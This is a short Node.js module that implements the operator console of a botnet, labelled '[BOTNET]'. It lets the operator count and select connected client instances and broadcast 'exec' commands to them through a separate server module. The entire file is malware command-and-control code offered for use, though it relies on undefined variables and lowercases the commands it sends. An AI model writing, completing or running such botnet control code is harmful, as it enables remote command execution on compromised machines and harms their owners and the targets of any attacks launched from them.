const readline = require("readline").createInterface({
	input: process.stdin,
	output: process.stdout,
});
const server = require("./server.js");

function prompt() {
	readline.question("[BOTNET] ", (msg) => {
		msg = msg.toLowerCase();

		if (msg === "instances") {
			console.log(`Instances: ${clientInstances.length}`);
		}

		if (msg.startsWith("instances")) {
			if (msg.split(" ")[1] <= clients.length) {
				clientInstances = [...clients];
				clientInstances = clientInstances.slice(0, msg.split(" ")[1]);
			}
		}

		if (msg.split(" ")[1] === "all") clientInstances = [...clients];

		if (msg.startsWith("exec")) server.broadcast(msg);
		return prompt();
	});
}

module.exports = {
	prompt: prompt,
};
